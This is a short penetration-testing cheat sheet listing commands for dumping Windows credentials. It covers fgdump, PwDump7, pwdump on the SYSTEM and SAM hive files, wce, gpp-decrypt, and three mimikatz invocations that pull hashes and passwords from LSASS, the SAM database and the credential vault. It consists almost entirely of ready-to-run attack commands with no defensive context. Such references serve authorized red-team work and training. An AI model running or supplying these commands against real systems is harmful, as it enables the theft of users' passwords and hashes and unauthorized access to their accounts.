---
id: 1c90268c-0239-48fa-8253-d78e1dc5b545
name: Password and Hash Dumping 3
type: cheatsheet
verified: true
created_at: '2019-09-26T22:51:06.915358+00:00'
updated_at: '2023-05-30T20:10:55.983412+00:00'
---

# Password and Hash Dumping 3

**Status**: ✓ Verified

# Description

Extracting passwords and hashes from files.



## Extracting Windows Hashes and Passwords





**Command** ([[fgdump Dump NTLM and LM hashes from a Local Windows System]]):

```bash
fgdump.exe
```









**Command** ([[pwdump7 Dump NTLM and LM hashes from a Local Windows System]]):

```bash
PwDump7.exe
```









**Command** ([[pwdump Dump NTLM and LM hashes from SYSTEM and SAM hive files]]):

```bash
pwdump SYSTEM SAM
```









**Command** ([[Extract NTLM/LM Passwords from Windows Logon Sessions]]):

```bash
wce.exe
```







## GPP Encrypted String





**Command** ([[gpp-decrypt Extract Password from a GPP Encrypted String]]):

```bash
gpp-decrypt $_ENCRYPTED_STRING
```





## Mimikatz





**Command** ([[Extract Windows LM/NTLM Hashes From LSASS]]):

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```









**Command** ([[Mimikatz Extract Windows LM/NTLM Hashes From SAM]]):

```bash
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```









**Command** ([[Mimikatz Extract Windows Saved Credentials from Vault]]):

```bash
mimikatz.exe "log" "privilege::debug" "vault::cred" "exit"
```








